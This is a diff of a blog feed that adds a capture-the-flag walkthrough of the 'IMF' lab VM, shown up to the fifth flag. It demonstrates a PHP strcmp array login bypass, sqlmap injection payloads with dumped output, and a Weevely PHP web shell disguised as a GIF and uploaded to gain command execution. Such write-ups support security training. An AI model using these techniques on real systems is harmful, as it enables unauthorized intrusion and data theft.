@@ -4,7 +4,7 @@
   <title><![CDATA[Core dump overflow]]></title>
   <link href="http://chousensha.github.io/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-09-21T13:22:02-04:00</updated>
+  <updated>2018-10-07T11:11:27-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,1147 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Hack the IMF]]></title>
+    <link href="http://chousensha.github.io/blog/2018/10/06/hack-the-imf/"/>
+    <updated>2018-10-06T02:45:42-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/10/06/hack-the-imf</id>
+    <content type="html"><![CDATA[<p>The VM description states that IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag.</p>
+
+<p>The difficulty is Beginner/Moderate</p>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT   STATE SERVICE VERSION
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span><span class='line'>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span><span class='line'>|_http-title: IMF - Homepage</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Only port 80 is open, so let&rsquo;s begin from there.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/home.png" title="homepage" alt="impossible mission force"></p>
+
+<p>So we learn that IMF stands for Impossible Mission Force and that it&rsquo;s a US intelligence agency. 3-letter agencies everywhere!</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/projects.png" title="projects" alt="imf projects"></p>
+
+<p>The Projects page makes for a fun read and it also reveals that the site is using PHP.</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/contact.png" title="contact" alt="imf contact"></p>
+
+<p>The contact page gives us some names and mail addresses:</p>
+
+<ul>
+<li>Roger S. Michaels &ndash; <a href="&#x6d;&#x61;&#x69;&#x6c;&#x74;&#111;&#58;&#114;&#x6d;&#x69;&#x63;&#x68;&#x61;&#x65;&#108;&#115;&#x40;&#x69;&#x6d;&#x66;&#46;&#108;&#111;&#x63;&#x61;&#108;">&#x72;&#x6d;&#105;&#x63;&#x68;&#x61;&#101;&#x6c;&#115;&#64;&#x69;&#109;&#102;&#46;&#x6c;&#111;&#x63;&#x61;&#x6c;</a></li>
+<li>Alexander B. Keith &ndash; <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#97;&#107;&#101;&#x69;&#116;&#x68;&#64;&#105;&#x6d;&#102;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#108;">&#x61;&#107;&#x65;&#105;&#116;&#104;&#x40;&#x69;&#109;&#102;&#x2e;&#x6c;&#111;&#99;&#x61;&#x6c;</a></li>
+<li>Elizabeth R. Stone &ndash; <a href="&#109;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#101;&#x73;&#x74;&#x6f;&#110;&#101;&#x40;&#105;&#x6d;&#x66;&#x2e;&#108;&#x6f;&#99;&#x61;&#108;">&#101;&#115;&#x74;&#111;&#110;&#x65;&#x40;&#x69;&#109;&#102;&#46;&#108;&#x6f;&#x63;&#x61;&#x6c;</a></li>
+</ul>
+
+
+<h1>Flag #1 &ndash; Read the source</h1>
+
+<p>The first flag can be found as a HTML comment in the source of the contact.php page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- flag1{YWxsdGhlZmlsZXM=} --&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decoding the base64 flag gives the hint <code>allthefiles</code>.</p>
+
+<h1>Flag #2 &ndash; JS includes</h1>
+
+<p>I interpreted the hint to mean bruteforce, but I tried with multiple tools and wordlists and didn&rsquo;t find anything. Going back through the HTML source, I noticed that several of the included Javascript files look like base64:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>    &lt;script src="js/ZmxhZzJ7YVcxbVl.js"&gt;&lt;/script&gt;
+</span><span class='line'>    &lt;script src="js/XUnRhVzVwYzNS.js"&gt;&lt;/script&gt;
+</span><span class='line'>    &lt;script src="js/eVlYUnZjZz09fQ==.min.js"&gt;&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Putting them all together gives the string <em>ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==</em>, which yields the second flag when decoded: <em>flag2{aW1mYWRtaW5pc3RyYXRvcg==}</em>. This, in turn, gives the next hint: <code>imfadministrator</code></p>
+
+<h1>Flag #3 &ndash; Exploiting PHP strcmp function</h1>
+
+<p>With no other services available, everything revolves around the site. Using the above hint in the URL takes us to a hastily-made login page:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/login.jpg" title="login" alt="login"></p>
+
+<p>And in the source there&rsquo;s an interesting comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger --&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, this added an interesting twist that exploits PHP functionality. Since the password is hardcoded, when attempting to log in we&rsquo;d expect a string comparison to be made between the user input and the hardcoded password value. This is done in PHP through the use of the <strong>strcmp()</strong> function:</p>
+
+<p>strcmp(string1,string2)</p>
+
+<p>This function returns:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0 - if the two strings are equal
+</span><span class='line'>&lt;0 - if string1 is less than string2
+</span><span class='line'>&gt;0 - if string1 is greater than string2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>However, when reading through its <a href="https://secure.php.net/manual/en/function.strcmp.php">manual page</a>, there was a very interesting comment by chris at unix-ninja dot com:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>strcmp() will return NULL on failure.
+</span><span class='line'>
+</span><span class='line'>This has the side effect of equating to a match when using an equals comparison (==).
+</span><span class='line'>Instead, you may wish to test matches using the identical comparison (===), which should not catch a NULL return.
+</span><span class='line'>
+</span><span class='line'>---------------------
+</span><span class='line'>  Example
+</span><span class='line'>---------------------
+</span><span class='line'>
+</span><span class='line'>$variable1 = array();
+</span><span class='line'>$ans === strcmp($variable1, $variable2);
+</span><span class='line'>
+</span><span class='line'>This will stop $ans from returning a match;
+</span><span class='line'>
+</span><span class='line'>Please use strcmp() carefully when comparing user input, as this may have potential security implications in your code.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If we build on this example, in case the login page was codded with an equals comparison, making the function fail may exhibit the same behavior as if the strings matched. And to do that, we&rsquo;ll have to compare the hardcoded string with something that is not a string, like an array in this example. I used Burp to intercept the POST request that looks like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user=&lt;input&gt;&pass=&lt;input&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>For the user, I used Roger&rsquo;s username that we&rsquo;ve discovered earlier. And then passed the password as an array:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user=rmichaels&pass[]=fail</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the login succeeded!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>flag3{Y29udGludWVUT2Ntcw==}
+</span><span class='line'>Welcome, rmichaels
+</span><span class='line'>IMF CMS</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The decoded flag says <code>continueTOcms</code>. And that IMF CMS is a link to <a href="http://192.168.145.130/imfadministrator/cms.php?pagename=home">http://192.168.145.130/imfadministrator/cms.php?pagename=home</a></p>
+
+<h1>Flag #4 &ndash; SQLi</h1>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/cms.jpg" title="imf cms" alt="imf cms"></p>
+
+<p>The Upload Report page is under construction. The Disavowed list is redacted:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/list.png" title="list" alt="list"></p>
+
+<p>In the URL, observe how the pages are constructed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cms.php?pagename=disavowlist</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried inserting a single quote in the pagename parameter and sure enough, a SQL error!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> Warning: mysqli_fetch_row() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/imfadministrator/cms.php on line 29</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Time for sqlmap!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u http://192.168.145.130/imfadministrator/cms.php?pagename=upload --cookie "PHPSESSID=o5jl7cjuohite8ifu20fghfkq1" --dbms=MySQL --dump-all
+</span><span class='line'>
+</span><span class='line'>GET parameter 'pagename' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+</span><span class='line'>sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
+</span><span class='line'>---
+</span><span class='line'>Parameter: pagename (GET)
+</span><span class='line'>    Type: boolean-based blind
+</span><span class='line'>    Title: AND boolean-based blind - WHERE or HAVING clause
+</span><span class='line'>    Payload: pagename=upload' AND 8343=8343 AND 'viDd'='viDd
+</span><span class='line'>
+</span><span class='line'>    Type: error-based
+</span><span class='line'>    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+</span><span class='line'>    Payload: pagename=upload' AND (SELECT 7643 FROM(SELECT COUNT(*),CONCAT(0x716a7a6271,(SELECT (ELT(7643=7643,1))),0x71766b7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'gVxy'='gVxy
+</span><span class='line'>
+</span><span class='line'>    Type: AND/OR time-based blind
+</span><span class='line'>    Title: MySQL &gt;= 5.0.12 AND time-based blind
+</span><span class='line'>    Payload: pagename=upload' AND SLEEP(5) AND 'UvGQ'='UvGQ
+</span><span class='line'>---
+</span><span class='line'>[04:20:24] [INFO] the back-end DBMS is MySQL
+</span><span class='line'>web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
+</span><span class='line'>web application technology: Apache 2.4.18
+</span><span class='line'>back-end DBMS: MySQL &gt;= 5.0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The output was huge, so here I left only the relevant part:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Database: admin
+</span><span class='line'>Table: pages
+</span><span class='line'>[4 entries]
+</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| id | pagename             | pagedata                                                                                                                                                              |
+</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| 1  | upload               | Under Construction.                                                                                                                                                   |
+</span><span class='line'>| 2  | home                 | Welcome to the IMF Administration.                                                                                                                                    |
+</span><span class='line'>| 3  | tutorials-incomplete | Training classrooms available. &lt;br /&gt;&lt;img src="./images/whiteboard.jpg"&gt;&lt;br /&gt; Contact us for training.                                                               |
+</span><span class='line'>| 4  | disavowlist          | &lt;h1&gt;Disavowed List&lt;/h1&gt;&lt;img src="./images/redacted.jpg"&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;*********&lt;/li&gt;&lt;li&gt;****** ******&lt;/li&gt;&lt;li&gt;*******&lt;/li&gt;&lt;li&gt;**** ********&lt;/li&gt;&lt;/ul&gt;&lt;br /&gt;-Secretary |
+</span><span class='line'>+----+----------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The admin DB contains a table with the pages that we&rsquo;ve seen in the CMS, but it looks like there&rsquo;s an extra page we didn&rsquo;t know about! Let&rsquo;s see it!</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/tutorials.png" title="tutorials" alt="tutorials"></p>
+
+<p>I used an online barcode reader for the QR code which revealed the flag: <em>flag4{dXBsb2Fkcjk0Mi5waHA=}</em>. And the next hint is <code>uploadr942.php</code></p>
+
+<h1>Flag #5 &ndash; PHP shell upload</h1>
+
+<p>Going to <a href="http://192.168.145.130/imfadministrator/uploadr942.php">http://192.168.145.130/imfadministrator/uploadr942.php</a> takes us to an upload form:</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/imf/upload.jpg" title="upload" alt="upload"></p>
+
+<p>Attempting to directly upload a PHP shell fails with an invalid file extension message. Then I tried a GIF downloaded from the internet, but another error, that the file is too large. So I just created a makeshift file with the GIF89 magic number and uploaded it with no problems. There was no mention of where ig might be located, but in the source code of the page now appeared a HTML comment:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;!-- d8988628c59f --&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tried putting that in the URL with a GIF extension, but that was a no-go. So I fired up dirb to see if there are any other directories under imfadministrator:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/usr/share/wordlists/dirb# dirb http://192.168.145.130/imfadministrator/ common.txt 
+</span><span class='line'>
+</span><span class='line'>---- Scanning URL: http://192.168.145.130/imfadministrator/ ----
+</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/images/                 
+</span><span class='line'>+ http://192.168.145.130/imfadministrator/index.php (CODE:200|SIZE:337)        
+</span><span class='line'>==&gt; DIRECTORY: http://192.168.145.130/imfadministrator/uploads/        </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome, it found and uploads directory. This time I appended the previous name to this new path and it found my GIF file. So the next thing was to repeat the process of a previous challenge and try uploading a PHP shell disguised as a GIF image. But today I decided to experiment with a different type of shell.</p>
+
+<h2>TTP breakdown &ndash; Weevely Weaponized web shell</h2>
+
+<p>Homepage: <a href="https://github.com/epinna/weevely3">https://github.com/epinna/weevely3</a></p>
+
+<p><strong>Description</strong></p>
+
+<blockquote><p>Weevely is a web shell designed for post-exploitation purposes that can be extended over the
+network at runtime.</p>
+
+<p>Upload weevely PHP agent to a target web server to get remote shell access to it. It has more than
+30 modules to assist administrative tasks, maintain access, provide situational awareness, elevate
+privileges, and spread into the target network.</p>
+
+<p>Features</p>
+
+<p>   Shell access to the target</p>
+
+<p>   SQL console pivoting on the target</p>
+
+<p>   HTTP/HTTPS proxy to browse through the target</p>
+
+<p>   Upload and download files</p>
+
+<p>   Spawn reverse and direct TCP shells</p>
+
+<p>   Audit remote target security</p>
+
+<p>   Run Meterpreter payloads</p>
+
+<p>   Port scan pivoting on target</p>
+
+<p>   Mount the remote filesystem</p>
+
+<p>   Bruteforce SQL accounts pivoting on the target</p>
+
+<p>Agent</p>
+
+<p>The agent is a small, polymorphic PHP script hardly detected by AV and the communication protocol
+is obfuscated within HTTP requests.</p></blockquote>
+
+<p>First, I installed Weevely on my machine by cloning its git repository and installing the requirements:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# apt-get install g++ python2.7 python-pip libyaml-dev python-dev libncurses5-dev
+</span><span class='line'>
+</span><span class='line'>root@kali:/opt/weevely3# pip install -r requirements.txt --upgrade</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then I ran the Weevely client:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/opt/weevely3# ./weevely.py 
+</span><span class='line'>
+</span><span class='line'>[+] weevely 3.6.2
+</span><span class='line'>[!] Error: too few arguments
+</span><span class='line'>
+</span><span class='line'>[+] Run terminal or command on the target
+</span><span class='line'>    weevely &lt;URL&gt; &lt;password&gt; [cmd]
+</span><span class='line'>
+</span><span class='line'>[+] Recover an existing session
+</span><span class='line'>    weevely session &lt;path&gt; [cmd]
+</span><span class='line'>
+</span><span class='line'>[+] Generate new agent
+</span><span class='line'>    weevely generate &lt;password&gt; &lt;path&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We need to generate the agent that we&rsquo;ll actually upload to the target server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py generate securepass harmless.php
+</span><span class='line'>Generated 'harmless.php' with password 'securepass' of 695 byte size.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I appended the GIF magic number at the beginning and changed the extension to GIF and successfully uploaded the shell. Then I connected to it with the Weevely client:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./weevely.py http://192.168.145.130/imfadministrator/uploads/c2fff7999be7.gif securepass
+</span><span class='line'>
+</span><span class='line'>[+] weevely 3.6.2
+</span><span class='line'>
+</span><span class='line'>[+] Target:   192.168.145.130
+</span><span class='line'>[+] Session:  /root/.weevely/sessions/192.168.145.130/c2fff7999be7_0.session
+</span><span class='line'>
+</span><span class='line'>[+] Browse the filesystem or execute commands starts the connection
+</span><span class='line'>[+] to the target. Type :help for more information.
+</span><span class='line'>
+</span><span class='line'>weevely&gt; :help
+</span><span class='line'>
+</span><span class='line'> :audit_disablefunctionbypass  Bypass disable_function restrictions with mod_cgi and .htaccess.     
+</span><span class='line'> :audit_phpconf                Audit PHP configuration.                                             
+</span><span class='line'> :audit_suidsgid               Find files with SUID or SGID flags.                                  
+</span><span class='line'> :audit_filesystem             Audit the file system for weak permissions.                          
+</span><span class='line'> :audit_etcpasswd              Read /etc/passwd with different techniques.                          
+</span><span class='line'> :shell_php                    Execute PHP commands.                                                
+</span><span class='line'> :shell_sh                     Execute shell commands.                                              
+</span><span class='line'> :shell_su                     Execute commands with su.                                            
+</span><span class='line'> :system_extensions            Collect PHP and webserver extension list.                            
+</span><span class='line'> :system_info                  Collect system information.                                          
+</span><span class='line'> :system_procs                 List running processes.                                              
+</span><span class='line'> :backdoor_reversetcp          Execute a reverse TCP shell.                                         
+</span><span class='line'> :backdoor_meterpreter         Start a meterpreter session.                                         
+</span><span class='line'> :backdoor_tcp                 Spawn a shell on a TCP port.                                         
+</span><span class='line'> :bruteforce_sql               Bruteforce SQL database.                                             
+</span><span class='line'> :file_upload2web              Upload file automatically to a web folder and get corresponding URL. 
+</span><span class='line'> :file_upload                  Upload file to remote filesystem.                                    
+</span><span class='line'> :file_read                    Read remote file from the remote filesystem.                         
+</span><span class='line'> :file_cp                      Copy single file.                                                    
+</span><span class='line'> :file_clearlog                Remove string from a file.                                           
+</span><span class='line'> :file_gzip                    Compress or expand gzip files.                                       
+</span><span class='line'> :file_tar                     Compress or expand tar archives.                                     
+</span><span class='line'> :file_enum                    Check existence and permissions of a list of paths.                  
+</span><span class='line'> :file_ls                      List directory content.                                              
+</span><span class='line'> :file_check                   Get attributes and permissions of a file.                            
+</span><span class='line'> :file_find                    Find files with given names and attributes.                          
+</span><span class='line'> :file_download                Download file from remote filesystem.                                
+</span><span class='line'> :file_rm                      Remove remote file.                                                  
+</span><span class='line'> :file_touch                   Change file timestamp.                                               
+</span><span class='line'> :file_cd                      Change current working directory.                                    
+</span><span class='line'> :file_webdownload             Download an URL.                                                     
+</span><span class='line'> :file_mount                   Mount remote filesystem using HTTPfs.                                
+</span><span class='line'> :file_grep                    Print lines matching a pattern in multiple files.                    
+</span><span class='line'> :file_zip                     Compress or expand zip files.                                        
+</span><span class='line'> :file_bzip2                   Compress or expand bzip2 files.                                      
+</span><span class='line'> :file_edit                    Edit remote file on a local editor.                                  
+</span><span class='line'> :sql_dump                     Multi dbms mysqldump replacement.                                    
+</span><span class='line'> :sql_console                  Execute SQL query or run console.                                    
+</span><span class='line'> :net_phpproxy                 Install PHP proxy on the target.                                     
+</span><span class='line'> :net_curl                     Perform a curl-like HTTP request.                                    
+</span><span class='line'> :net_mail                     Send mail.                                                           
+</span><span class='line'> :net_proxy                    Run local proxy to pivot HTTP/HTTPS browsing through the target.     
+</span><span class='line'> :net_ifconfig                 Get network interfaces addresses.                                    
+</span><span class='line'> :net_scan                     TCP Port scan.                                                       
+</span><span class='line'>
+</span><span class='line'>The system shell interpreter is not available in this session, use the
+</span><span class='line'>following command replacements to simulate a unrestricted shell.
+</span><span class='line'>
+</span><span class='line'> touch                                      file_touch       
+</span><span class='line'> whoami, hostname, pwd, uname               system_info      
+</span><span class='line'> gzip, gunzip                               file_gzip        
+</span><span class='line'> mail                                       net_mail         
+</span><span class='line'> curl                                       net_curl         
+</span><span class='line'> zip, unzip                                 file_zip         
+</span><span class='line'> nmap                                       net_scan         
+</span><span class='line'> cd                                         file_cd          
+</span><span class='line'> rm                                         file_rm          
+</span><span class='line'> ps                                         system_procs     
+</span><span class='line'> cat                                        file_read        
+</span><span class='line'> ifconfig                                   shell_su         
+</span><span class='line'> vi, vim, emacs, nano, pico, gedit, kwrite  file_edit        
+</span><span class='line'> wget                                       file_webdownload 
+</span><span class='line'> find                                       file_find        
+</span><span class='line'> tar                                        file_tar         
+</span><span class='line'> ifconfig                                   net_ifconfig     
+</span><span class='line'> bzip2, bunzip2                             file_bzip2       
+</span><span class='line'> ls, dir                                    file_ls          
+</span><span class='line'> cp, copy                                   file_cp          
+</span><span class='line'> grep                                       file_grep  </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now let&rsquo;s use it to poke around:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>weevely&gt; whoami
+</span><span class='line'>www-data
+</span><span class='line'>www-data@imf:/var/www/html/imfadministrator/uploads $ :system_info
+</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+
+</span><span class='line'>| client_ip          | 192.168.145.129                                                               |
+</span><span class='line'>| max_execution_time | 30                                                                            |
+</span><span class='line'>| script             | /imfadministrator/uploads/c2fff7999be7.gif                                    |
+</span><span class='line'>| open_basedir       |                                                                               |
+</span><span class='line'>| hostname           | imf                                                                           |
+</span><span class='line'>| php_self           | /imfadministrator/uploads/c2fff7999be7.gif                                    |
+</span><span class='line'>| script_folder      | /var/www/html/imfadministrator/uploads                                        |
+</span><span class='line'>| uname              | Linux imf 4.4.0-45-generic #66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 |
+</span><span class='line'>| pwd                | /var/www/html/imfadministrator/uploads                                        |
+</span><span class='line'>| safe_mode          | False                                                                         |
+</span><span class='line'>| php_version        | 7.0.32-0ubuntu0.16.04.1                                                       |
+</span><span class='line'>| dir_sep            | /                                                                             |
+</span><span class='line'>| os                 | Linux                                                                         |
+</span><span class='line'>| whoami             | www-data                                                                      |
+</span><span class='line'>| document_root      | /var/www/html                                                                 |
+</span><span class='line'>+--------------------+-------------------------------------------------------------------------------+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Listing the files in the current directory gives us the fifth flag!</p>
